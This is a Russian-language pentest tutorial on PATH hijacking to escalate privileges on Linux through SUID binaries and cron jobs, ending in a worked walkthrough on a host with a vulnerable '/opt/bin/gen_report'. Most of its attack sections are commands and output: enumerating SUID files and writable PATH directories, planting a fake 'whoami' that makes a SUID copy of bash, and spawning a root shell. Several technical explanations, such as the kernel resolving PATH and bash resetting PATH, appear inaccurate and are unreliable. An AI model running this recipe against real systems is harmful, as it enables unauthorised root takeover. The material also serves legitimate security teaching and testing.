# Path hijacking: повышение привилегий через манипуляцию переменной окружения PATH

## 1. Контекст и базовые понятия

**Path hijacking** (перехват пути) — техника локального повышения привилегий в Linux-системах, использующая порядок разрешения имён исполняемых файлов, задаваемый переменной окружения `PATH`. Атака возможна, когда процесс с повышенными правами (например, SUID-программа, cron-задача суперпользователя или сервис systemd) вызывает другую программу **без указания абсолютного пути**, а в одной из директорий, перечисленных в `PATH` и доступных атакующему на запись, размещается вредоносный исполняемый файл с таким же именем. Поскольку система просматривает директории `PATH` последовательно, злонамеренный двоичный файл будет запущен первым и унаследует права вызывающего процесса.

Ключевое условие эксплуатации — наличие **привилегированного контекста выполнения** (SUID/SGID-бит, root-владелец cron, привилегированный systemd-сервис). Без этого вредоносный код исполнится лишь с правами текущего пользователя и не приведёт к эскалации. Важно отличать path hijacking от других техник, также опирающихся на подмену путей или окружения, но использующих иные механизмы.

```text
   Привилегированный процесс (SUID root)
          │
          │  system("whoami")
          ▼
   Поиск исполняемого файла "whoami" в директориях $PATH (слева направо):
   
    /home/user/.local/bin  ──► НЕТ whoami
             │
    /home/user/bin        ──► НЕТ whoami
             │
    /usr/local/bin        ──► НЕТ whoami
             │
    /usr/bin              ──► ЕСТЬ /usr/bin/whoami  (легитимный)
             │
    /bin                  ──► не достигнуто
   
   После подмены (writable /home/user/.local/bin):
   
    /home/user/.local/bin ──► ЕСТЬ вредоносный whoami (исполнен с правами root)
```

*ASCII-схема: порядок разрешения команды через PATH и эффект подмены.*

**Основные понятия**

- **Переменная окружения `PATH`** — список директорий, разделённых двоеточием, в котором операционная система ищет исполняемые файлы при вызове команды без абсолютного пути. Порядок слева направо: чем левее директория, тем выше приоритет. Значение наследуется дочерними процессами и может быть переопределено локально `export PATH=/tmp:$PATH`.
- **Относительный и абсолютный путь**: вызов `/bin/whoami` — абсолютный, путь не зависит от `PATH`; вызов `whoami` или `./whoami` — относительный или частичный, для разрешения используется `PATH` (кроме случаев с указанием текущей директории `./`).
- **Системные вызовы семейства exec**: `execve` не использует `PATH`, `execvp` и `execvpe` используют. Функция `system()` из стандартной библиотеки C вызывает `/bin/sh -c command`, при этом оболочка может искать `command` через `PATH`.
- **SUID (Set owner User ID)** — бит прав (4000), при установке которого процесс запускается с эффективным идентификатором владельца файла, а не пользователя, запустившего программу. SGID (2000) — аналогично для группы. Именно это свойство делает path hijacking опасным: вредоносный код унаследует повышенные права.

Таким образом, path hijacking занимает свою нишу среди техник локальной эскалации, эксплуатируя не столько уязвимость конкретного кода, сколько особенности разрешения имён в комбинации с уже имеющимися у процесса привилегиями.

## 2. Внутреннее устройство: механизмы и сценарии атаки

Path hijacking реализуется в несколько стадий, каждая из которых определяется конфигурацией целевой системы и конкретным привилегированным процессом. Рассмотрим **ключевые сценарии**, приводящие к успешной эксплуатации, и лежащий в основе механизм.

### 2.1. Механизм разрешения имён через PATH

Когда процесс вызывает функцию `execvp(filename, argv)`, ядро последовательно проверяет каждую директорию из переменной `PATH` окружения процесса. Для каждой директории `dir_i` конструируется строка `dir_i/filename`, и с помощью `execve` предпринимается попытка запуска. Если файл существует и исполняем, он запускается; в противном случае перебираются остальные директории. Для функции `system(command)` путь ещё сложнее: фактически вызывается `/bin/sh -c command`, и уже оболочка интерпретирует `command`. Оболочка сама может обрабатывать `PATH` при поиске команды, что открывает дополнительный вектор влияния.

Важно, что при запуске SUID-программ многие оболочки (bash, dash) сбрасывают переменную `PATH` до безопасного значения, если они запущены без флага `-p` (privileged mode). Поэтому в эксплоитах часто используют команду `/bin/bash -p`, чтобы сохранить модифицированный `PATH` и дать возможность вредоносному скрипту выполниться с привилегиями. Аналогично, некоторые реализации `system()` внутри могут сбросить переменную окружения перед выполнением, поэтому эксплуатация должна учитывать конкретную среду.

### 2.3. Нюансы оболочек и безопасные механизмы

Современные Linux-дистрибутивы включают меры противодействия path hijacking:

- При запуске SUID-программ оболочка bash, если вызвана без `-p`, сбрасывает некоторые переменные окружения (включая `PATH`) до значений из `/etc/environment`. Аналогично ведёт себя dash.
- Функция `system()` в glibc использует `/bin/sh -c`; если `/bin/sh` собран с опцией `-p` по умолчанию (что нетипично), сброса не произойдёт. В большинстве случаев `system()` всё же будет исполнять команду с урезанным окружением, что может помешать атаке. Однако это поведение не гарантированно, и противник может обойти его, скомпилировав собственный SUID-бинарник или используя альтернативные трактовки (например, `execlp` напрямую).
- Для надёжного получения root-шелла часто применяют комбинацию: вредоносный скрипт копирует `/bin/bash` в `/tmp/bash`, выставляет на него SUID-бит (`chmod 4755`), а затем в интерактивном сеансе запускают `/tmp/bash -p`. Это позволяет избежать зависимости от поведения оболочки при исполнении скрипта через `system()`.

Эти особенности делают эксплуатацию зависимой от конкретной конфигурации системы, что требует тщательного предварительного анализа.

## 3. Применение и работа с path hijacking на практике

Реализация атаки в рамках теста на проникновение состоит из трёх этапов: **разведка** (обнаружение потенциально уязвимых привилегированных процессов), **анализ PATH** (поиск директорий, доступных для записи и расположенных в начале списка), **эксплуатация** (создание вредоносной программы и запуск уязвимого процесса). Ниже приведены типовые команды и процедуры.

### 3.1. Обнаружение SUID- и SGID-файлов, а также подозрительных вызовов

```bash
# Поиск всех файлов с SUID-битом, исключая системные каталоги для уменьшения шума
find / -type f -perm -4000 -user root 2>/dev/null | grep -v -E '^/(usr/lib|lib|var|proc)'
```

Ожидаемый вывод (примерный):
```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/local/bin/report_gen
...
```
`/usr/local/bin/report_gen` — потенциально нестандартный файл, подлежащий дальнейшему изучению.

Анализ содержимого бинарного файла на предмет вызовов команд без абсолютных путей:
```bash
strings /usr/local/bin/report_gen | grep -E '^[a-zA-Z0-9_]+$' | grep -v '^[A-Z_]*$'
```
Пример вывода:
```
whoami
date
id
```
Присутствие в выводе коротких команд, не содержащих `/`, указывает на возможное использование `system()` или `execvp()` без полного пути.

Более точный метод — динамический анализ с помощью `strace`, если есть возможность выполнить бинарник с текущими правами:
```bash
strace -f -e execve /usr/local/bin/report_gen 2>&1 | grep execve
```
В выводе будут строки вида:
```
execve("/usr/bin/whoami", ["whoami"], 0x7ffe... /* 21 vars */) = 0
```
Если в трассировке отсутствуют полные пути, а используются только имена исполняемых файлов, это подтверждает уязвимость.

Для cron-задач анализируют системные файлы:
```bash
cat /etc/crontab
ls -la /etc/cron.d/
grep -rh "^[^#]" /etc/cron* 2>/dev/null | grep -v '/'
```

### 3.2. Анализ переменной PATH и доступных для записи директорий

Текущее значение `PATH` для оболочки с низкими привилегиями:
```bash
echo $PATH
```
Вывод:
```
/home/user/.local/bin:/home/user/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Проверка каждой директории на возможность записи:
```bash
echo $PATH | tr ':' '\n' | while read dir; do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done
```
Результат:
```
WRITABLE: /home/user/.local/bin
WRITABLE: /home/user/bin
```
Именно эти директории подходят для размещения вредоносного файла, ведь они идут раньше системных `/usr/bin` и `/bin`.

Если в стандартном `PATH` нет подходящих директорий, атакующий может модифицировать переменную, экспортируя собственное значение, при условии, что привилегированный процесс наследует окружение без фильтрации:
```bash
export PATH=/tmp:$PATH
```
Это допустимо, если, например, SUID-программа не сбрасывает окружение или администратор разрешил сохранять пользовательские переменные.

### 3.3. Эксплуатация: создание вредоносного исполняемого файла

Предположим, что уязвимый SUID-бинарник вызывает `whoami`. Тогда в writable директории `/home/user/.local/bin` создаётся скрипт:
```bash
cat > /home/user/.local/bin/whoami << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /home/user/.local/bin/whoami
```
Альтернативный вариант для немедленного получения оболочки:
```bash
#!/bin/bash
/bin/bash -p
```
Однако вариант с копированием bash и установкой SUID-бита надёжнее, так как не зависит от поведения оболочки, вызванной `system()`, и позволяет в любой момент запустить `/tmp/rootbash -p` для получения root.

Запуск уязвимого бинарника:
```bash
/usr/local/bin/report_gen
```
Если атака успешна, в `/tmp` появится SUID-файл `rootbash`:
```bash
ls -l /tmp/rootbash
```
```
-rwsr-xr-x 1 root root 1183448 Feb 10 10:15 /tmp/rootbash
```
Затем переход в `/tmp` и запуск с сохранением привилегий:
```bash
/tmp/rootbash -p
id
```
Вывод:
```
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```
Привилегированный доступ получен, техника сработала.

В некоторых случаях стандартный сценарий может не сработать из-за фильтрации окружения. Тогда можно попытаться переопределить `PATH` непосредственно перед запуском SUID-файла:
```bash
PATH=/home/user/.local/bin:$PATH /usr/local/bin/report_gen
```
Этот приём работает, если SUID-программа при старте не выполняет сброс переменной из соображений безопасности.

## 4. Сквозной практический пример: эскалация на хосте с уязвимым SUID-отчётом генерации

**Исходные условия:** в ходе пентеста получен доступ от имени пользователя `bob` на сервер Ubuntu 20.04. С помощью скриптов автоматического перечисления (`LinPEAS`) выявлен нестандартный SUID-файл `/opt/bin/gen_report`. Первичный осмотр показывает, что он принадлежит root и установлен с битом SUID.

### Шаг 1. Обнаружение и анализ SUID-бинарника

```bash
find / -type f -perm -4000 -user root 2>/dev/null | grep -vE '^/(usr/lib|lib|snap)'
```
Вывод фрагмента:
```
/usr/bin/passwd
/usr/bin/sudo
/opt/bin/gen_report
```
Вызываем `strings` для быстрого анализа:
```bash
strings /opt/bin/gen_report | grep -E '^[a-z]+$'
```
Вывод:
```
whoami
cat
date
system
```
Команды `whoami`, `cat`, `date` указаны без путей — высокая вероятность использования `system()`.

Динамический анализ (выполняем с текущими правами, так как бинарник не требует повышенных прав для запуска вне SUID-контекста):
```bash
strace -f -e execve /opt/bin/gen_report 2>&1 | grep execve
```
Фрагмент вывода:
```
execve("/usr/bin/whoami", ...) = 0
execve("/usr/bin/cat", ...) = 0
execve("/usr/bin/date", ...) = 0
```
Вызовы используют полные пути, так как `strace` перехватывает уже разрешённые `execve`. Но если бы использовался `execvp`, то в аргументах было бы только имя. В выводе `strace` видно фактические полные пути, что не отменяет возможность подмены: она произошла бы на этапе разрешения имени, но `strace` показывает уже разрешённое имя. Тем не менее, информация о том, какие команды выполняются, ценна.

### Шаг 2. Проверка PATH и writable-директорий

```bash
echo $PATH
```
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/bob/bin
```
Ищем доступные для записи каталоги:
```bash
echo $PATH | tr ':' '\n' | while read dir; do [ -w "$dir" ] && echo "WRITABLE: $dir"; done
```
Результат:
```
WRITABLE: /home/bob/bin
```
Каталог `/home/bob/bin` находится в списке последним, поэтому стандартный порядок поиска не приведёт к перехвату. Однако мы можем модифицировать `PATH`, чтобы переместить его в начало. Убедимся, что `gen_report` не сбрасывает `PATH` принудительно (зависит от реализации; во многих случаях не сбрасывает, если не используется `bash -p` или явный вызов `clearenv`).

### Шаг 3. Эксплуатация с предварительной модификацией PATH

Создаём вредоносный скрипт `whoami` в `/home/bob/bin`:
```bash
cat > /home/bob/bin/whoami << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /home/bob/bin/whoami
```

Меняем `PATH`, ставя `/home/bob/bin` в начало:
```bash
export PATH=/home/bob/bin:$PATH
echo $PATH
```
```
/home/bob/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Запускаем уязвимый бинарник:
```bash
/opt/bin/gen_report
```

Проверяем появление SUID-файла:
```bash
ls -l /tmp/rootbash
```
Вывод:
```
-rwsr-xr-x 1 root root 1183448 Oct  7 12:34 /tmp/rootbash
```

### Шаг 4. Получение рут-оболочки

```bash
/tmp/rootbash -p
id
```
Вывод подтверждает привилегии:
```
uid=1001(bob) gid=1001(bob) euid=0(root) groups=1001(bob)
```

Дополнительно можно проверить, что оболочка действительно работает от root:
```bash
whoami
```
```
root
```

Таким образом, техника path hijacking позволила повысить привилегии от непривилегированного пользователя до суперпользователя за счёт некорректного вызова внешних команд в SUID-программе и возможности контролировать порядок поиска через `PATH`.
